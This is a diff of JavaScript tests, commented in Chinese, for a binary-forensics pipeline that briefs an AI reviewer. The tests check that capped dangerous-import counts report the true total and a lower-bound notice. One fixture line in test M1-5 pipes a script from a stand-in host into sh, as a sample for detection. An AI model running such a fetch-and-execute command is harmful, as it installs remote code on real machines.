@@ -1574,6 +1574,44 @@ test('S3A-21 危险族命中导入那一行的两条边角：条数上限复用 
   assert.equal(absent.includes('危险族命中导入'), false, '老报告没有这个字段时不许编一条出来（也不许炸）');
 });
 
+test('S3A-22 名单被 CAPABILITY_IMPORT_CAP 截过时，这一行报的必须是真总数并写明是下限（主控复验那一发）', () => {
+  // 复现的是 A 自己的病：`capabilityImports` 是截过的那份（≤64），`capabilityImportsTotal` 才是真数。
+  // 拿截短后的长度当计数念 = 把「偏低」念成「就这么多了」，正是本轮要消灭的那一形状，只是搬到 AI 那一层。
+  const elf = Buffer.concat([Buffer.from(ELF8), randomBuf(31, 600)]);
+  const shown = Array.from({ length: 64 }, (_, i) => `unlink_c${String(i).padStart(2, '0')}`);
+  const row = {
+    name: 'z.so', kind: 'ELF', entryBytes: 608, outcome: 'ELF_FAMILIES', importCount: 4096,
+    capabilityImports: shown, capabilityImportsTotal: 200, capabilityImportsCapped: true,
+    families: ['EXEC', 'NET', 'NS', 'FILEWRITE'], summary: 's',
+  };
+  const b = buildBrief({ report: { ...R, binaryForensics: [row] }, entries: [entryOf('z.so', elf)] });
+  const line = b.text.split('\n').find((l) => l.startsWith('- z.so |')) || '';
+  assert.match(line, /危险族命中导入 200\b/, `计数要用 total，不是截短后的数组长度：${line}`);
+  assert.equal(/危险族命中导入 64\b/.test(line), false, '把 64 当总数念就是「偏低被念成干净」');
+  assert.ok(line.includes('族集合是下限') || line.includes('名单在 64 条处截过'),
+    `capped=true 必须在这一行里留一句下限声明：${line}`);
+});
+
+test('S3A-23 下限声明不许藏在会被 200 字符切掉的「静态结论」里（它得自己是一格）', () => {
+  // 现状：capped 那句拼在 message 末尾，而 digest 的 `静态结论` 只取 summary 前 200 字符 ——
+  // listing 一长就把那句切没了。声明要活下来只能自己占一格。
+  const elf = Buffer.concat([Buffer.from(ELF8), randomBuf(32, 600)]);
+  const longHead = 'FILEWRITE 文件写出与改名（' + Array.from({ length: 40 }, (_, i) => `unlink_x${i}`).join(', ') + '）';
+  const row = {
+    name: 'z.so', kind: 'ELF', entryBytes: 608, outcome: 'ELF_FAMILIES', importCount: 4096,
+    capabilityImports: ['unlink_a'], capabilityImportsTotal: 200, capabilityImportsCapped: true,
+    families: ['FILEWRITE'],
+    summary: `z.so：ELF（AArch64，4096 个导入） —— 链接期一定会用到 1 类危险能力：${longHead}`
+      + '；危险族名单在 64 条处截过，族集合是下限',
+  };
+  const b = buildBrief({ report: { ...R, binaryForensics: [row] }, entries: [entryOf('z.so', elf)] });
+  const line = b.text.split('\n').find((l) => l.startsWith('- z.so |')) || '';
+  const atSummary = line.indexOf('静态结论');
+  assert.ok(atSummary >= 0, `这一行要有静态结论那一格：${line.slice(0, 200)}`);
+  assert.ok(line.slice(0, atSummary).includes('族集合是下限'),
+    `下限声明必须在「静态结论」之前自己出现，不能指望那句不被 200 字符上限切掉：${line.slice(0, atSummary).slice(-120)}`);
+});
+
 test('M1-5 polyglot 送全文并可逐字复验（静态按 T4 读过的条目，AI 不许只拿元信息）', () => {
   const body = '#!/system/bin/sh\n# 备份\ncurl -sS https://payload.invalid/st.sh | sh\n';
   const poly = Buffer.concat([Buffer.from(ELF8), Buffer.from(body, 'utf8')]);
